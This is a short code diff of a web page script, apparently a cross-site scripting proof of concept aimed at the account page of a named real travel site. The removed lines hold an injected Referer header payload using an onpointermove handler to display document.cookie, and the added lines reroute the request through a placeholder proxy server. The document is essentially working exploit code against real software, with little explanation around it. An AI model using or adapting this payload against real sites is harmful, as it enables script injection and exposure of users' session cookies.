@@ -8,11 +8,9 @@
 
     <script>
     document.getElementById("xssLink").addEventListener("click", function() {
-        // Construct the URL with the malicious Referer header
-        var url = "https://travelpirates.hometogo.com/account/"><";
+        var url = "http://your-server.com/proxy.php"; // Update with your server's URL
         var xhr = new XMLHttpRequest();
         xhr.open("GET", url, true);
-        xhr.setRequestHeader("Referer", 'tester90?><>><<x12 only=xxxxx onpointermove=prompt(document?.cookie)>hover-here-for-xss');
         xhr.send();
     });
     </script>
